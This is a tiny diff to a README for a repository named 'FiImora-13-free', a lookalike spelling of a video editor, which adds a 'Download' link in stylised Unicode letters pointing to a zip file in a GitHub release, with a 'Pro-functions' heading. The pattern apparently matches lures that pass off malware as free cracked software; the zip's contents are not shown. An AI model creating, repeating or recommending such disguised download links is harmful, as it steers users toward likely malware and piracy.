@@ -1,6 +1,6 @@
 # FiImora-13-free
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/flishflash/FiImora-13-free-/releases/download/FiImora-13-free/FiImora-13-free.zip)
 
 
 # Pro-functions
